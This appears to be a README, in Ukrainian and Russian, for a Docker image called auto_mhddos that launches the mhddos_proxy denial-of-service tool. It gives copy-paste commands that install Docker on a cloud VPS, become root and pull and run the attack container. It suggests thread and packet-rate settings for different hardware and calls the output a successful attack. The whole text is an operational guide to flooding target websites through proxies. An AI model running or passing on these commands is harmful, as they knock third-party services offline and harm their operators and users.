### Для запуску на Ubuntu 20 Azure vps, 1 встановлює docker; 2 переводить у root; 3 запускає auto_Mhddos_proxy

```shell
sudo snap install docker;
sudo su;
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100  --debug
```

### Команды docker для разного железа: 

-- Слабое (2 ядра + 2-4 ГБ Озу).


```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100  
```
  
-- Среднее (4 ядра + 4-8 Гб Озу) .Эти же параметры использутся по умолчанию, если запускать команду без аргументов.:   
  

```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 1000 200  
```
  
-- Быстрое(4+ ядер + 8+ Гб Озу):  

  
```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 2500 400  
```
  
Значение параметров на примере "500 100":  
  
500 - количество потоков (threads). Параметр -t в mhddos_proxy.  
  
100 - параметр --rpc в mhddos_proxy. (количество пакетов отправляемых на прокси-сервер, перед тем как он передаст их на сайт-цель)  

Пример успешной атаки без третьего параметра --debug(больше ничего выводится не будет):  
![Стандартный вывод](https://user-images.githubusercontent.com/74729549/159160084-3ffd870b-7d17-44c9-9108-3908212402ce.png)  


ТАКЖЕ МОЖНО ДОБАВИТЬ В КОНЕЦ ТРЕТИЙ ПАРАМЕТР --debug , чтоб выводилась информация о каждом отправленном пакете,  
например:  
```shell
docker run -it --rm --pull always ghcr.io/aruiem234/auto_mhddos:latest 500 100 --debug  
```
пример вывода с параметром --debug:  
![Параметр --debug](https://user-images.githubusercontent.com/74729549/159160027-dcc51f91-3d0b-4dd7-abe8-b63edf136e1e.png)  
